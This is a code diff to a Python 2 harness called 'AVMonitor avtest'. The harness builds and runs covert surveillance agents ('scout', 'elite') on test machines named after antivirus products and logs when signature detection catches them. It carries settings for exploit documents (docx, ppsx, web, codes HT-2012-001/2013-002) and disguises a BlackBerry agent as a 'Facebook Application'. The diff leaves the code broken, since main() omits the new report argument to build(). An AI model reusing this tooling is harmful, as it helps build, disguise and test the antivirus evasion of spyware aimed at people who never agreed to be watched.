@@ -29,6 +29,7 @@ MOUSEEVENTF_LEFTDOWN = 0x0002  # left button down
 MOUSEEVENTF_LEFTUP = 0x0004  # left button up
 MOUSEEVENTF_CLICK = MOUSEEVENTF_LEFTDOWN + MOUSEEVENTF_LEFTUP
 
+
 def unzip(filename, fdir):
     zfile = zipfile.ZipFile(filename)
     names = []
@@ -39,31 +40,31 @@ def unzip(filename, fdir):
         names.append('%s/%s' % (fdir, name))
     return names
 
-def check_static(files):
 
+def check_static(files):
     success = []
     failed = []
     for content in files:
-        logging.debug( "DBG: check_static: %s" % content )
+        logging.debug("DBG: check_static: %s" % content)
         break
         #TODO: fix
         dst = content.split("/")
 
         src_dir = "build"
-        dst_dir = src_dir+ "/__copy__"
+        dst_dir = src_dir + "/__copy__"
 
-        for i in range(0,(len(dst)-1)):
+        for i in range(0, (len(dst) - 1)):
             src_dir += "/%s" % dst[i]
             dst_dir += "/%s" % dst[i]
 
         if not os.path.exists(dst_dir):
             os.makedirs(dst_dir)
 
-        src_exe = "%s/%s" % (src_dir,dst[-1])
+        src_exe = "%s/%s" % (src_dir, dst[-1])
         if "exe" not in src_exe or "bat" not in src_exe or "dll" not in src_exe:
-            dst_exe = "%s/%s.exe" % (dst_dir,dst[-1])
+            dst_exe = "%s/%s.exe" % (dst_dir, dst[-1])
         else:
-            dst_exe = "%s/%s" % (dst_dir,dst[-1])
+            dst_exe = "%s/%s" % (dst_dir, dst[-1])
 
         if not os.path.exists(src_exe):
             failed.append(src_exe)
@@ -83,8 +84,9 @@ def check_static(files):
     if not failed:
         add_result("+ SUCCESS CHECK_STATIC: %s" % success)
     else:
-        add_result("+ FAILED CHECK_STATIC. SIGNATURE DETECTION: %s" % failed )
+        add_result("+ FAILED CHECK_STATIC. SIGNATURE DETECTION: %s" % failed)
     return failed
+
 
 def internet_on():
     ips = ['87.248.112.181', '173.194.35.176', '176.32.98.166',
@@ -98,13 +100,14 @@ def internet_on():
     s = [q.get() for i in ips]
     return any(s)
 
+
 def check_internet(address, queue):
     """ True if dns or http are reachable """
     logging.debug("- Check connection: %s" % address)
 
     ret = False
     try:
-        if(ret is False):
+        if (ret is False):
             response = urllib2.urlopen('http://' + address, timeout=5)
             # logging.debug("i reach url: ", address)
             ret |= True
@@ -112,6 +115,7 @@ def check_internet(address, queue):
         ret |= False
 
     queue.put(ret)
+
 
 def wait_timeout(proc, seconds):
     """Wait for a process to finish, or raise exception after timeout"""
@@ -150,9 +154,8 @@ class connection:
 
 
 class AgentBuild:
-
     def __init__(self, backend, frontend=None, platform='windows', kind='silent',
-                 ftype='desktop', blacklist=[], param = None):
+                 ftype='desktop', blacklist=[], param=None):
         self.kind = kind
         self.host = (backend, frontend)
         if "winxp" in socket.gethostname():
@@ -161,7 +164,7 @@ class AgentBuild:
             self.hostname = socket.gethostname().replace("win7", "")
         else:
             self.hostname = socket.gethostname().replace("win8", "")
-#        self.hostname = socket.gethostname()
+        #        self.hostname = socket.gethostname()
         self.blacklist = blacklist
         self.platform = platform
         self.ftype = ftype
@@ -183,7 +186,8 @@ class AgentBuild:
             assert c
             if not c.logged_in():
                 logging.warn("Not logged in")
-            logging.debug("DBG type: " + self.ftype + ", operation: " + operation + ", target: " + target + ", factory: " + factory)
+            logging.debug(
+                "DBG type: " + self.ftype + ", operation: " + operation + ", target: " + target + ", factory: " + factory)
 
             operation_id, group_id = c.operation(operation)
             if not operation_id:
@@ -272,7 +276,7 @@ class AgentBuild:
             except Exception, e:
                 logging.debug("DBG trace %s" % traceback.format_exc())
                 add_result("+ ERROR SCOUT BUILD EXCEPTION RETRIEVED")
-                
+
                 raise e
 
     def _execute_build(self, exenames):
@@ -289,11 +293,11 @@ class AgentBuild:
         except Exception, e:
             logging.debug("DBG trace %s" % traceback.format_exc())
             add_result("+ FAILED SCOUT EXECUTE")
-            
+
             raise e
 
     def _click_mouse(self, x, y):
-            # move first
+    # move first
         x = 65536L * x / ctypes.windll.user32.GetSystemMetrics(0) + 1
         y = 65536L * y / ctypes.windll.user32.GetSystemMetrics(1) + 1
         ctypes.windll.user32.mouse_event(MOUSEEVENTF_MOVEABS, x, y, 0, 0)
@@ -329,7 +333,7 @@ class AgentBuild:
                 add_result("+ SUCCESS ELITE SYNC")
             else:
                 add_result("+ FAILED ELITE SYNC")
-                
+
             return ret
 
     def _uninstall(self, instance_id):
@@ -391,7 +395,7 @@ class AgentBuild:
 
         if not instance:
             logging.debug("- exiting execute_elite because did't sync")
-            
+
             return
 
         logging.debug("- Try upgrade to elite")
@@ -405,13 +409,13 @@ class AgentBuild:
             else:
                 result = "+ FAILED ELITE UPGRADE"
                 logging.debug(result)
-            
+
             return
         else:
             if self.hostname in self.blacklist:
                 result = "+ FAILED ELITE BLACKLISTED"
                 logging.debug(result)
-                
+
                 return
 
         logging.debug("- Elite, Wait for 25 minutes: %s" % time.ctime())
@@ -435,7 +439,7 @@ class AgentBuild:
 
         logging.debug("- Result: %s" % elite)
         logging.debug("- sending Results to Master")
-        
+
 
     def execute_scout(self):
         """ build and execute the  """
@@ -464,7 +468,7 @@ class AgentBuild:
             add_result("+ FAILED SCOUT SYNC")
             output = self._list_processes()
             logging.debug(output)
-            
+
         logging.debug("- Result: %s" % instance)
         return instance
 
@@ -488,8 +492,8 @@ class AgentBuild:
 
         logging.debug("- Built")
 
-#        add_result("+ platfoooorm %s" % self.platform)
-#        add_result("+ kiiiiiiiind %s" % self.kind)
+        #        add_result("+ platfoooorm %s" % self.platform)
+        #        add_result("+ kiiiiiiiind %s" % self.kind)
 
         meltfile = None
         if self.kind == 'melt':
@@ -554,6 +558,7 @@ class AgentBuild:
 
     def execute_web_expl(self, websrv):
         """ WEBZ: we need to download some files only """
+
         def check_file(filename):
             try:
                 with open(filename):
@@ -573,16 +578,21 @@ class AgentBuild:
                 done = False
                 break
         if done is True:
-                add_result("+ SUCCESS EXPLOIT SAVE")
+            add_result("+ SUCCESS EXPLOIT SAVE")
         else:
             add_result("+ FAILED EXPLOIT SAVE")
 
 
 results = []
+report_send = None
+
 def add_result(result):
-    global results
+    global results, report_send
     logging.debug(result)
     results.append(result)
+    if report_send:
+        report_send(result)
+
 
 internet_checked = False
 
@@ -595,13 +605,13 @@ def execute_agent(args, level, platform):
     logging.debug("DBG ftype: %s" % ftype)
 
     vmavtest = AgentBuild(args.backend, args.frontend,
-                       platform, args.kind, ftype, args.blacklist, args.param)
+                          platform, args.kind, ftype, args.blacklist, args.param)
 
     """ starts a scout """
     if socket.gethostname() not in ['Zanzara.local', 'win7zenoav', "paradox"]:
         if not internet_checked and internet_on():
             add_result("+ ERROR: I reach Internet")
-            
+
             exit(0)
 
     internet_checked = True
@@ -618,7 +628,7 @@ def execute_agent(args, level, platform):
 
             add_result("+ SUCCESS SERVER CONNECT")
             action = {"elite": vmavtest.execute_elite, "scout":
-                      vmavtest.execute_scout, "pull": vmavtest.execute_pull}
+                vmavtest.execute_scout, "pull": vmavtest.execute_pull}
             sleep(5)
             action[level]()
 
@@ -632,8 +642,9 @@ def clean(args):
     vmavtest = AgentBuild(args.backend, args.frontend, args.kind)
     vmavtest._delete_targets(operation)
 
-def build(action, platform, platform_type, kind, param, backend, frontend, blacklist):
-    global results
+
+def build(action, platform, platform_type, kind, param, backend, frontend, blacklist, report):
+    global results, report_send
     results = []
 
     class Args:
@@ -647,10 +658,13 @@ def build(action, platform, platform_type, kind, param, backend, frontend, black
     args.backend = backend
     args.frontend = frontend
     args.param = param
-    args.blacklist=blacklist
-    args.platform_type=platform_type
+    args.blacklist = blacklist
+    args.platform_type = platform_type
+    report_send = report
 
     connection.host = args.backend
+
+    report_send("+ INIT %s, %s, %s" % (action, platform, kind))
 
     try:
         if action in ["pull", "scout", "silent"]:
@@ -664,7 +678,6 @@ def build(action, platform, platform_type, kind, param, backend, frontend, black
 
 
 def main():
-
     parser = argparse.ArgumentParser(description='AVMonitor avtest.')
 
     #'elite'
@@ -687,8 +700,6 @@ def main():
     else:
         avname = socket.gethostname().replace("win8", "").lower()
 
-
-
     platform_type = {}
     for v in platform_desktop:
         platform_type[v] = 'desktop'
@@ -700,69 +711,80 @@ def main():
 
     params = {}
     params['blackberry'] = {
-    'platform': 'blackberry',
-    'binary': {'demo': demo},
-    'melt': {'appname': 'facebook',
-             'name': 'Facebook Application',
-             'desc': 'Applicazione utilissima di social network',
-             'vendor': 'face inc',
-             'version': '1.2.3'},
-    'package': {'type': 'local'}}
+        'platform': 'blackberry',
+        'binary': {'demo': demo},
+        'melt': {'appname': 'facebook',
+                 'name': 'Facebook Application',
+                 'desc': 'Applicazione utilissima di social network',
+                 'vendor': 'face inc',
+                 'version': '1.2.3'},
+        'package': {'type': 'local'}}
     params['windows'] = {
         'platform': 'windows',
         'binary': {'demo': demo, 'admin': False},
         'melt': {'scout': True, 'admin': False, 'bit64': True, 'codec': True},
         'sign': {}
-        }
+    }
     params['android'] = {
         'platform': 'android',
         'binary': {'demo': demo, 'admin': False},
         'sign': {},
         'melt': {}
-        }
+    }
     params['linux'] = {
         'platform': 'linux',
         'binary': {'demo': demo, 'admin': False},
         'melt': {}
-        }
+    }
     params['osx'] = {'platform': 'osx',
                      'binary': {'demo': demo, 'admin': True},
                      'melt': {}
-                     }
+    }
     params['ios'] = {'platform': 'ios',
                      'binary': {'demo': demo},
                      'melt': {}
-                     }
+    }
 
     params['exploit'] = {"generate":
-                         {"platforms": ["windows"], "binary": {"demo": False, "admin": False}, "exploit": "HT-2012-001",
-                          "melt": {"demo": False, "scout": True, "admin": False}}, "platform": "exploit", "deliver": {"user": "USERID"},
+                             {"platforms": ["windows"], "binary": {"demo": False, "admin": False},
+                              "exploit": "HT-2012-001",
+                              "melt": {"demo": False, "scout": True, "admin": False}}, "platform": "exploit",
+                         "deliver": {"user": "USERID"},
                          "melt": {"combo": "txt", "filename": "example.txt", "appname": "agent.exe",
                                   "input": "000"}, "factory": {"_id": "000"}
-                         }
+    }
 
     params['exploit_docx'] = {"generate":
-                              {"platforms": ["windows"], "binary": {"demo": False, "admin": False}, "exploit": "HT-2013-002",
-                               "melt": {"demo": False, "scout": True, "admin": False}},
+                                  {"platforms": ["windows"], "binary": {"demo": False, "admin": False},
+                                   "exploit": "HT-2013-002",
+                                   "melt": {"demo": False, "scout": True, "admin": False}},
                               "platform": "exploit", "deliver": {"user": "USERID"},
-                              "melt": {"filename": "example.docx", "appname": "APPNAME", "input": "000", "url": "http://HOSTNAME/APPNAME"}, "factory": {"_id": "000"}
-                              }
+                              "melt": {"filename": "example.docx", "appname": "APPNAME", "input": "000",
+                                       "url": "http://HOSTNAME/APPNAME"}, "factory": {"_id": "000"}
+    }
     params['exploit_ppsx'] = {"generate":
-                              {"platforms": ["windows"], "binary": {"demo": False, "admin": False}, "exploit": "HT-2013-003",
-                               "melt": {"demo": False, "scout": True, "admin": False}},
+                                  {"platforms": ["windows"], "binary": {"demo": False, "admin": False},
+                                   "exploit": "HT-2013-003",
+                                   "melt": {"demo": False, "scout": True, "admin": False}},
                               "platform": "exploit", "deliver": {"user": "USERID"},
-                              "melt": {"filename": "example.ppsx", "appname": "APPNAME", "input": "000", "url": "http://HOSTNAME/APPNAME"}, "factory": {"_id": "000"}
-                              }
+                              "melt": {"filename": "example.ppsx", "appname": "APPNAME", "input": "000",
+                                       "url": "http://HOSTNAME/APPNAME"}, "factory": {"_id": "000"}
+    }
     params['exploit_web'] = {"generate":
-                             {"platforms": ["windows"], "binary": {"demo": False, "admin": False}, "exploit": "HT-2013-002",
-                              "melt": {"demo": False, "scout": True, "admin": False}},
+                                 {"platforms": ["windows"], "binary": {"demo": False, "admin": False},
+                                  "exploit": "HT-2013-002",
+                                  "melt": {"demo": False, "scout": True, "admin": False}},
                              "platform": "exploit", "deliver": {"user": "USERID"},
-                             "melt": {"filename": "example.docx", "appname": "APPNAME", "input": "000", "url": "http://HOSTNAME/APPNAME"}, "factory": {"_id": "000"}
-                             }
+                             "melt": {"filename": "example.docx", "appname": "APPNAME", "input": "000",
+                                      "url": "http://HOSTNAME/APPNAME"}, "factory": {"_id": "000"}
+    }
 
-    build(args.action, args.platform, platform_type[args.platform], args.kind, params[args.platform], args.backend, args.frontend,  blacklist )
+    build(args.action, args.platform, platform_type[args.platform], args.kind, params[args.platform], args.backend,
+          args.frontend, blacklist)
+
 
 if __name__ == "__main__":
     import logging.config
+
     logging.config.fileConfig('../logging.conf')
     main()
